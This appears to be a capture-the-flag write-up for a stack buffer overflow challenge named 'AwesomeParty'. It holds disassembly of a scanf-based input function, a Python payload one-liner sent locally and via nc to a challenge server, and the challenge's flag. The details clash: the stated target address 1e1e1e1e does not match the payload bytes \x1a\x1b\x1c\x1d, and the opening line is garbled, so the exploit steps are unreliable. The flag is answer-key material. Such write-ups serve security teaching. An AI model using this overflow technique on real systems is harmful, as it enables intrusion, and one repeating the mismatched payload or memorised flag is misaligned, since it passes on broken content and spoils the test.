# Party Invitation

## Question Text

There's an awesome that's going to go down next week. 

Created by Noans

## Distribution
AwesomeParty `SHA1: 1da2366a0e70a9a5158b4606e96c1c4ad5cbb8c9`

## Solution
1. Do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
2. The following parts of from the `objdump` should be studied:  
```
00000000004005c6 <check>:
4005c6:	55                   	push   %rbp
4005c7:	48 89 e5             	mov    %rsp,%rbp
4005ca:	48 83 ec 20          	sub    $0x20,%rsp
4005ce:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
4005d2:	48 89 c6             	mov    %rax,%rsi
4005d5:	bf 78 06 40 00       	mov    $0x400678,%edi
4005da:	b8 00 00 00 00       	mov    $0x0,%eax
4005df:	e8 cc fe ff ff       	callq  400470 <__isoc99_scanf@plt>
4005e4:	bf 7b 06 40 00       	mov    $0x40067b,%edi
4005e9:	e8 a2 fe ff ff       	callq  400450 <puts@plt>
4005ee:	90                   	nop
4005ef:	c9                   	leaveq
4005f0:	c3                   	retq
```
3. The third line tells us 32 bytes is reserved for a variable.
4. Derive that one needs to override 32 bytes + rbp (8 bytes) to overwrite return address.
5. Also derive address of `awesome` function is `1e1e1e1e`.

Final command to exploit local program assuming machine uses little-endian:  
`python -c 'print "a" * 40 + "\x1a\x1b\x1c\x1d"' | ./AwesomeParty`

In order to get the flag, players have to pipe the output to the game server:  
`python -c 'print "a" * 40 + "\x1a\x1b\x1c\x1d"' | nc pwn.chal.gryphonctf.com 18153`

## Flag
`GCTF{4W3S0M3_L177L3_P4R7Y}`

## Recommended Reads
* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
* https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64